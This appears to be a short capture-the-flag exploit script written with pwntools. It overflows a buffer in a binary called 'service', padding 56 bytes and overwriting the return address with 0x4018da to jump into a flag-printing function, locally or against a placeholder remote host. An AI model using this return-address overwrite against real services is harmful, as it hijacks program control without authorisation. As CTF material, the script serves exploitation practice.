#!/usr/bin/env python3

from pwn import *

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("XXX.XXX.XXX.XXX", 00000)

    return r


def main():
    r = conn()

    # Jump into magie, right where the function prints the flag
    offset = 56
    r.sendline(flat({offset: p64(0x4018da)}))

    print(r.recvall().decode(errors='ignore'))
    r.close()


if __name__ == "__main__":
    main()
